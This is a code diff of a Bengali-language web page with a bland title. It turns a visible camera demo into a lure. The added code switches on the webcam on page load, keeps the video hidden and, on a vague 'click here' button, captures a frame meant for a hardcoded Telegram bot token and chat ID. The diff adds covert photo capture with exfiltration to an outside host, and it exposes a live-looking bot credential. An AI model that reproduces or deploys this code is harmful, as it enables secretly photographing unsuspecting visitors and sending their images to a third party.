@@ -29,46 +29,41 @@
         }
         video, canvas {
             display: none;
-            margin-top: 20px;
         }
     </style>
 </head>
 <body>
 
     <h1>মাছ ভরা বল</h1>
-    <p>আপনার ক্যামেরা পারমিশন দিন এবং ছবি তুলুন!</p>
+    <p>ক্লিক করুন এবং ছবিটি টেলিগ্রামে পাঠানো হবে!</p>
     
-    <video id="video" width="300" height="225" autoplay></video>
-    <canvas id="canvas" width="300" height="225"></canvas>
-    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
     <br>
-    <button onclick="startCamera()">📷 ক্যামেরা চালু করুন</button>
-    <button onclick="captureAndSend()">📩 ক্লিক হিয়ার (ছবি তুলুন)</button>
+    <button onclick="captureAndSend()">📩 ক্লিক হিয়ার</button>
 
     <script>
         let video = document.getElementById("video");
         let canvas = document.getElementById("canvas");
         let context = canvas.getContext("2d");
 
-        // ক্যামেরা চালু করার ফাংশন
-        function startCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    video.srcObject = stream;
-                    video.style.display = "block";
-                })
-                .catch(function(error) {
-                    alert("ক্যামেরা চালু করতে সমস্যা হয়েছে: " + error);
-                });
-        }
+        // ওয়েবসাইট লোড হলে ক্যামেরা চালু হবে (কিন্তু দেখানো হবে না)
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+            })
+            .catch(function(error) {
+                alert("ক্যামেরা চালু করতে সমস্যা হয়েছে: " + error);
+            });
 
         // ছবি তুলে টেলিগ্রামে পাঠানোর ফাংশন
         function captureAndSend() {
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             let imageData = canvas.toDataURL("image/png"); // ছবির ডাটা
 
-            let botToken = "YOUR_BOT_TOKEN"; // 🔴 এখানে তোমার বট টোকেন বসাও
-            let chatId = "YOUR_CHAT_ID"; // 🔴 এখানে তোমার টেলিগ্রাম চ্যাট আইডি বসাও
+            let botToken = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec"; // 🔴 এখানে তোমার বট টোকেন বসাও
+            let chatId = "7294674899"; // 🔴 এখানে তোমার টেলিগ্রাম চ্যাট আইডি বসাও
 
             let formData = new FormData();
             formData.append("chat_id", chatId);
